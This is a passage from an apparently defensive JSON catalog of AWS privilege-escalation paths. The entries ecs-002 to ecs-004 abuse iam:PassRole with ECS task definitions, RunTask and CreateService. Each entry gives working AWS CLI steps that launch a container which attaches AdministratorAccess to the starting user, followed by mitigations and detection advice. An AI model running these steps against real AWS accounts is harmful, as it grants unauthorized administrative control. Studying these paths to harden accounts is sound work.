          "permission": "iam:PassRole",
          "resourceConstraints": "Must have access to a role that trusts ecs-tasks.amazonaws.com"
        },
        {
          "permission": "ecs:CreateCluster",
          "resourceConstraints": "Must be able to create ECS clusters"
        },
        {
          "permission": "ecs:RegisterTaskDefinition",
          "resourceConstraints": "Must be able to register task definitions"
        },
        {
          "permission": "ecs:RunTask",
          "resourceConstraints": "Must be able to run tasks on the cluster"
        }
      ],
      "additional": [
        {
          "permission": "ec2:DescribeVpcs",
          "resourceConstraints": "Helpful for finding default VPC for Fargate network configuration"
        },
        {
          "permission": "ec2:DescribeSubnets",
          "resourceConstraints": "Helpful for finding subnets for Fargate network configuration"
        },
        {
          "permission": "ecs:DescribeTasks",
          "resourceConstraints": "Useful for monitoring task status and completion"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles that trust ecs-tasks.amazonaws.com"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role permissions and trust policies"
        }
      ]
    },
    "description": "A principal with `iam:PassRole`, `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` can achieve privilege escalation by creating a new ECS cluster, registering a task definition that uses a privileged IAM role, and running that task on Fargate. The task executes with the permissions of the passed role and can perform actions to escalate the starting principal's privileges, such as attaching policies, creating access keys, or modifying IAM permissions. Unlike traditional EC2-based privilege escalation, this path does not require EC2 permissions and runs entirely within ECS Fargate's serverless container platform.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts ecs-tasks.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "A role must exist that trusts ecs-tasks.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sts get-caller-identity",
          "description": "Get the current AWS account ID, which will be needed for constructing ARNs"
        },
        {
          "step": 2,
          "command": "aws ecs create-cluster --cluster-name privesc-cluster",
          "description": "Create a new ECS cluster to host the privileged task"
        },
        {
          "step": 3,
          "command": "aws ec2 describe-vpcs --filters \"Name=isDefault,Values=true\" --query \"Vpcs[0].VpcId\" --output text\naws ec2 describe-subnets --filters \"Name=vpc-id,Values=<VPC_ID>\" --query \"Subnets[*].SubnetId\" --output text\n",
          "description": "Retrieve the default VPC and subnet IDs required for Fargate networking configuration"
        },
        {
          "step": 4,
          "command": "aws ecs register-task-definition \\\n  --family privesc-task \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 \\\n  --memory 512 \\\n  --task-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --execution-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --container-definitions '[{\n    \"name\": \"privesc-container\",\n    \"image\": \"amazon/aws-cli:latest\",\n    \"command\": [\"sh\", \"-c\", \"aws iam attach-user-policy --user-name VICTIM_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"]\n  }]'\n",
          "description": "Register a task definition that uses the privileged role and contains a container that executes commands to escalate privileges (e.g., attaching AdministratorAccess policy to the starting user)"
        },
        {
          "step": 5,
          "command": "aws ecs run-task \\\n  --cluster privesc-cluster \\\n  --task-definition privesc-task \\\n  --launch-type FARGATE \\\n  --network-configuration \"awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}\"\n",
          "description": "Run the task on the Fargate cluster with the privileged role, executing the escalation commands"
        },
        {
          "step": 6,
          "command": "aws ecs describe-tasks --cluster privesc-cluster --tasks TASK_ARN",
          "description": "Monitor the task status to confirm it has completed successfully"
        },
        {
          "step": 7,
          "command": "aws sts get-caller-identity",
          "description": "Verify that the escalation succeeded by checking current permissions (e.g., test administrative access)"
        }
      ]
    },
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or lateral movement to other resources.\n",
    "recommendation": "Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:\n\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ecs-tasks.amazonaws.com\"\n    }\n  }\n}\n\nAdditionally, restrict `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` to specific resources or environments where they are needed.\n\nMonitor for unusual combinations of these actions in CloudTrail:\n- New cluster creation followed by task registration and execution\n- Task definitions that reference privileged IAM roles\n- Tasks running with roles that have administrative permissions\n\nConsider implementing Service Control Policies (SCPs) to prevent sensitive roles from being passed to ECS tasks.\n",
    "discoveredBy": {
      "name": "Nick Spagnola",
      "organization": "Rhino Security Labs",
      "date": "2020"
    },
    "references": [
      {
        "title": "Auditing iam:PassRole: A Problematic Privilege Escalation Permission",
        "url": "https://www.tenable.com/blog/auditing-iampassrole-a-problematic-privilege-escalation-permission"
      },
      {
        "title": "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers",
        "url": "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
      }
    ],
    "relatedPaths": [
      "ec2-001",
      "ecs-001",
      "lambda-001"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-runtask",
        "description": "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole, ecs:CreateCluster, ecs:RegisterTaskDefinition, and ecs:RunTask permissions. Can be an IAM user or role.\n"
        },
        {
          "id": "task_definition",
          "label": "New ECS Task Definition",
          "type": "resource",
          "description": "The registered ECS task definition with the target role passed via iam:PassRole. The task definition includes a container with commands to execute with the target role's permissions.\n"
        },
        {
          "id": "ecs_task",
          "label": "New Running ECS Task",
          "type": "resource",
          "description": "An ECS task running on Fargate that executes the containerized code. Unlike CreateService, RunTask executes the task once without creating a persistent service.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the ecs-tasks Service",
          "type": "resource",
          "description": "The IAM role passed to the ECS task definition. Must trust ecs-tasks.amazonaws.com. When the task runs, it automatically assumes this role and executes with its permissions.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access. The task can attach admin policies to the starting principal or create new access keys.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation including possible access to sensitive data or additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions, the privilege escalation may not provide meaningful additional access beyond what the starting principal already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "task_definition",
          "label": "iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition",
          "description": "The attacker creates an ECS cluster and registers a task definition that passes a privileged role.\n\nCommands:\n```bash\naws ecs create-cluster --cluster-name exploit-cluster\naws ecs register-task-definition \\\n  --family privesc-task \\\n  --task-role-arn \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 --memory 512 \\\n  --container-definitions '[{\"name\":\"exploit\",\"image\":\"amazon/aws-cli:latest\",\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"STARTING_USER\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]'\n```\n"
        },
        {
          "from": "task_definition",
          "to": "ecs_task",
          "label": "ecs:RunTask",
          "description": "The attacker runs the task on Fargate, which executes once without creating a service.\n\nCommand:\n```bash\naws ecs run-task \\\n  --cluster exploit-cluster \\\n  --task-definition privesc-task \\\n  --launch-type FARGATE \\\n  --network-configuration \"awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}\"\n```\n"
        },
        {
          "from": "ecs_task",
          "to": "target_role",
          "label": "Task assumes role and executes",
          "description": "The ECS task automatically assumes the target role and executes the containerized commands with all permissions granted to the target role.\n"
        },
        {
          "from": "target_role",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.\n"
        },
        {
          "from": "target_role",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation with access to sensitive resources or further escalation opportunities.\n"
        },
        {
          "from": "target_role",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal permissions, the task execution may not yield meaningful privilege escalation.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-11T01:49:54Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ecs/ecs-002.yaml"
  },
  {
    "id": "ecs-003",
    "name": "iam:PassRole + ecs:RegisterTaskDefinition + ecs:CreateService",
    "category": "service-passrole",
    "services": [
      "iam",
      "ecs"
    ],
    "description": "A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:CreateService` can create an ECS task definition with a privileged IAM role and launch it as a Fargate service. When the task runs, it executes with the permissions of the passed role. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "An ECS cluster must exist in the account",
        "A role must exist that trusts ecs-tasks.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "An ECS cluster must exist in the account",
        "A role must exist that trusts ecs-tasks.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sts get-caller-identity",
          "description": "Get your account ID for constructing resource ARNs"
        },
        {
          "step": 2,
          "command": "aws ecs list-clusters",
          "description": "List available ECS clusters in the account"
        },
        {
          "step": 3,
          "command": "aws ec2 describe-vpcs --filters \"Name=isDefault,Values=true\"\naws ec2 describe-subnets --filters \"Name=vpc-id,Values=VPC_ID\"\n",
          "description": "Get the default VPC ID and subnet IDs for Fargate network configuration"
        },
        {
          "step": 4,
          "command": "aws ecs register-task-definition \\\n  --family privesc-task \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 \\\n  --memory 512 \\\n  --task-role-arn \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --execution-role-arn \"arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole\" \\\n  --container-definitions '[{\n    \"name\": \"privesc-container\",\n    \"image\": \"public.ecr.aws/amazonlinux/amazonlinux:latest\",\n    \"command\": [\"sh\", \"-c\", \"aws sts get-caller-identity; aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"],\n    \"essential\": true,\n    \"logConfiguration\": {\n      \"logDriver\": \"awslogs\",\n      \"options\": {\n        \"awslogs-group\": \"/ecs/privesc-task\",\n        \"awslogs-region\": \"us-east-1\",\n        \"awslogs-stream-prefix\": \"ecs\"\n      }\n    }\n  }]'\n",
          "description": "Register a task definition with the privileged role and container that executes commands to escalate privileges"
        },
        {
          "step": 5,
          "command": "aws ecs create-service \\\n  --cluster CLUSTER_NAME \\\n  --service-name privesc-service \\\n  --task-definition privesc-task \\\n  --launch-type FARGATE \\\n  --desired-count 1 \\\n  --network-configuration \"awsvpcConfiguration={subnets=[SUBNET_ID],securityGroups=[SG_ID],assignPublicIp=ENABLED}\"\n",
          "description": "Create an ECS service that launches the task on Fargate"
        },
        {
          "step": 6,
          "command": "aws ecs list-tasks --cluster CLUSTER_NAME --service-name privesc-service\naws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN\n",
          "description": "Monitor the task status until it completes execution"
        },
        {
          "step": 7,
          "command": "aws sts get-caller-identity",
          "description": "Verify that your permissions have been escalated (if the task modified your principal)"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificECSTaskRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ecs-tasks.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditionally, restrict ECS task and service operations:\n- Limit `ecs:RegisterTaskDefinition` to specific task families or require approval workflows\n- Restrict `ecs:CreateService` to specific clusters or task definitions\n- Monitor CloudTrail for RegisterTaskDefinition followed by CreateService or RunTask\n- Use ECS service-level IAM permissions to control who can create services\n- Implement VPC security groups and network policies to limit container network access\n",
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or data exfiltration from the container environment.\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown"
    },
    "references": [
      {
        "title": "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers",
        "url": "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
      },
      {
        "title": "Auditing iam:PassRole: A Problematic Privilege Escalation Permission",
        "url": "https://www.tenable.com/blog/auditing-iampassrole-a-problematic-privilege-escalation-permission"
      },
      {
        "title": "AWS - ECS Privesc",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ecs-privesc"
      }
    ],
    "relatedPaths": [
      "ec2-001",
      "lambda-001",
      "ecs-001",
      "ecs-002"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+ecs-registertaskdefinition+ecs-createservice",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole, ecs:RegisterTaskDefinition, and ecs:CreateService permissions. Can be an IAM user or role. Unlike ecs-001, this path assumes an ECS cluster already exists.\n"
        },
        {
          "id": "task_definition",
          "label": "New ECS Task Definition",
          "type": "resource",
          "description": "The registered ECS task definition with the target role passed via iam:PassRole. Includes a container with commands to execute when the task runs.\n"
        },
        {
          "id": "ecs_service",
          "label": "New ECS Service",
          "type": "resource",
          "description": "An ECS service created on an existing cluster that launches the task. The service maintains the task until completion.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the ecs-tasks Service",
          "type": "resource",
          "description": "The IAM role passed to the task definition. Must trust ecs-tasks.amazonaws.com. The task automatically assumes this role when it runs.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions, the attacker gains full administrative access by having the task attach admin policies to the starting principal.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation with possible access to sensitive data or additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role has minimal permissions, the privilege escalation may not provide meaningful additional access.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "task_definition",
          "label": "iam:PassRole + ecs:RegisterTaskDefinition",
          "description": "The attacker registers a task definition that passes a privileged role.\n\nCommand:\n```bash\naws ecs register-task-definition \\\n  --family privesc-task \\\n  --task-role-arn \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 --memory 512 \\\n  --container-definitions '[{\"name\":\"exploit\",\"image\":\"amazon/aws-cli:latest\",\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"STARTING_USER\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]'\n```\n"
        },
        {
          "from": "task_definition",
          "to": "ecs_service",
          "label": "ecs:CreateService",
          "description": "The attacker creates a service on an existing ECS cluster.\n\nCommand:\n```bash\naws ecs create-service \\\n  --cluster existing-cluster \\\n  --service-name privesc-service \\\n  --task-definition privesc-task \\\n  --desired-count 1 \\\n  --launch-type FARGATE \\\n  --network-configuration \"awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}\"\n```\n"
        },
        {
          "from": "ecs_service",
          "to": "target_role",
          "label": "Service launches task with role",
          "description": "The ECS service launches the task which automatically assumes the target role and executes the containerized commands with the role's permissions.\n"
        },
        {
          "from": "target_role",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.\n"
        },
        {
          "from": "target_role",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation.\n"
        },
        {
          "from": "target_role",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role has minimal permissions, the task may not yield meaningful privilege escalation.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "ecs:RegisterTaskDefinition",
          "resourceConstraints": "Must have permission to register ECS task definitions"
        },
        {
          "permission": "ecs:CreateService",
          "resourceConstraints": "Must have permission to create ECS services"
        }
      ],
      "additional": [
        {
          "permission": "ec2:DescribeVpcs",
          "resourceConstraints": "Helpful for finding the default VPC for network configuration"
        },
        {
          "permission": "ec2:DescribeSubnets",
          "resourceConstraints": "Helpful for finding subnets for Fargate network configuration"
        },
        {
          "permission": "ecs:DescribeClusters",
          "resourceConstraints": "Useful for discovering available ECS clusters and their configurations"
        },
        {
          "permission": "ecs:ListClusters",
          "resourceConstraints": "Helpful for listing all available clusters in the account"
        },
        {
          "permission": "ecs:DescribeServices",
          "resourceConstraints": "Useful for monitoring service creation and status"
        },
        {
          "permission": "ecs:DescribeTasks",
          "resourceConstraints": "Helpful for monitoring task execution and completion"
        },
        {
          "permission": "ecs:ListTasks",
          "resourceConstraints": "Useful for listing tasks in the service to monitor execution"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-11T01:49:54Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ecs/ecs-003.yaml"
  },
  {
    "id": "ecs-004",
    "name": "iam:PassRole + ecs:RegisterTaskDefinition + ecs:RunTask",
    "category": "service-passrole",
    "services": [
      "iam",
      "ecs"
    ],
    "description": "A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` can create a new ECS task definition and attach an existing IAM role to it. When the task is run on Fargate or EC2, the code executes with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "An ECS cluster must exist in the account",
        "A role must exist that trusts ecs-tasks.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "An ECS cluster must exist in the account",
        "A role must exist that trusts ecs-tasks.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sts get-caller-identity",
          "description": "Get your AWS account ID for use in subsequent commands"
        },
        {
          "step": 2,
          "command": "aws ecs list-clusters",
          "description": "Identify available ECS clusters in the account"
        },
        {
          "step": 3,
          "command": "aws ec2 describe-vpcs --filters \"Name=isDefault,Values=true\"\naws ec2 describe-subnets --filters \"Name=vpc-id,Values=VPC_ID\"\n",
          "description": "Get the default VPC and subnet IDs needed for Fargate network configuration"
        },
        {
          "step": 4,
          "command": "aws ecs register-task-definition \\\n  --family privesc-task \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 \\\n  --memory 512 \\\n  --task-role-arn \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --execution-role-arn \"arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole\" \\\n  --container-definitions '[{\n    \"name\": \"exploit-container\",\n    \"image\": \"public.ecr.aws/amazonlinux/amazonlinux:latest\",\n    \"essential\": true,\n    \"command\": [\"/bin/sh\", \"-c\", \"aws sts get-caller-identity && aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"]\n  }]'\n",
          "description": "Register a task definition that uses the privileged role and includes a container with commands to escalate privileges"
        },
        {
          "step": 5,
          "command": "aws ecs run-task \\\n  --cluster CLUSTER_NAME \\\n  --task-definition privesc-task \\\n  --launch-type FARGATE \\\n  --network-configuration \"awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}\"\n",
          "description": "Run the task on Fargate, which will execute the container with the privileged role's permissions"
        },
        {
          "step": 6,
          "command": "aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN",
          "description": "Monitor the task status until it reaches STOPPED state (execution complete)"
        },
        {
          "step": 7,
          "command": "aws sts get-caller-identity",
          "description": "Verify that your privileges have been escalated by the task execution"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificECSTaskRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ecs-tasks.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditionally, restrict ECS task definition registration and task execution:\n- Limit `ecs:RegisterTaskDefinition` to specific task definition families or require approval workflows\n- Restrict `ecs:RunTask` to specific clusters or task definitions\n- Use SCPs to prevent tasks from running with overly privileged roles\n- Monitor CloudTrail for unusual task definition registration followed by immediate task execution\n- Alert on ECS tasks that make IAM API calls (iam:AttachUserPolicy, iam:CreateAccessKey, etc.)\n",
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or data exfiltration.\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown",
      "date": "Unknown"
    },
    "references": [
      {
        "title": "Auditing iam:PassRole: A Problematic Privilege Escalation Permission",
        "url": "https://www.tenable.com/blog/auditing-iampassrole-a-problematic-privilege-escalation-permission"
      },
      {
        "title": "AWS - ECS Privesc",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ecs-privesc"
      },
      {
        "title": "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers",
        "url": "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
      }
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "ecs:RegisterTaskDefinition",
          "resourceConstraints": "Must have permission to register new task definitions"
        },
        {
          "permission": "ecs:RunTask",
          "resourceConstraints": "Must have permission to run tasks in the target cluster"
        }
      ],
      "additional": [
        {
          "permission": "ecs:ListClusters",
          "resourceConstraints": "Helpful for discovering available ECS clusters"
        },
        {
          "permission": "ecs:DescribeClusters",
          "resourceConstraints": "Useful for getting cluster details and ARNs"
        },
        {
          "permission": "ecs:DescribeTasks",
          "resourceConstraints": "Helpful for monitoring task execution status"
        },
        {
          "permission": "ec2:DescribeVpcs",
          "resourceConstraints": "Needed to find VPCs for Fargate network configuration"
        },
        {
          "permission": "ec2:DescribeSubnets",
          "resourceConstraints": "Needed to find subnets for Fargate network configuration"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+ecs-registertaskdefinition+ecs-runtask",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "ecs_takeover",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS attacks"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole, ecs:RegisterTaskDefinition, and ecs:RunTask permissions. Can be an IAM user or role. This path uses an existing ECS cluster.\n"
        },
        {
          "id": "task_definition",
          "label": "New ECS Task Definition",
          "type": "resource",
          "description": "The registered ECS task definition with the target role passed via iam:PassRole. Includes a container with commands to execute when launched.\n"
        },
        {
          "id": "ecs_task",
          "label": "New Running ECS Task",
          "type": "resource",
          "description": "An ECS task running on Fargate, launched via ecs:RunTask. Unlike CreateService, this executes once without a persistent service.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the ecs-tasks Service",
          "type": "resource",
          "description": "The IAM role passed to the task definition. Must trust ecs-tasks.amazonaws.com. The task automatically assumes this role when it runs.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions, the attacker gains full administrative access via the task's actions.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role has minimal permissions, the privilege escalation may not provide meaningful additional access.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "task_definition",
          "label": "iam:PassRole + ecs:RegisterTaskDefinition",
          "description": "The attacker registers a task definition that passes a privileged role.\n\nCommand:\n```bash\naws ecs register-task-definition \\\n  --family privesc-task \\\n  --task-role-arn \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 --memory 512 \\\n  --container-definitions '[{\"name\":\"exploit\",\"image\":\"amazon/aws-cli:latest\",\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"STARTING_USER\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]'\n```\n"
        },
        {
          "from": "task_definition",
          "to": "ecs_task",
          "label": "ecs:RunTask",
          "description": "The attacker runs the task on Fargate.\n\nCommand:\n```bash\naws ecs run-task \\\n  --cluster existing-cluster \\\n  --task-definition privesc-task \\\n  --launch-type FARGATE \\\n  --network-configuration \"awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}\"\n```\n"
        },
        {
          "from": "ecs_task",
          "to": "target_role",
          "label": "Task assumes role and executes",
          "description": "The task automatically assumes the target role and executes the containerized commands with the role's permissions.\n"
        },
        {
          "from": "target_role",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.\n"
        },
        {
          "from": "target_role",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation.\n"
        },
        {
          "from": "target_role",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role has minimal permissions, the task may not yield meaningful privilege escalation.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-11T01:49:54Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ecs/ecs-004.yaml"
  },
  {
    "id": "ecs-005",
    "name": "iam:PassRole + ecs:RegisterTaskDefinition + ecs:StartTask",
    "category": "service-passrole",
    "services": [
      "iam",
      "ecs"
    ],
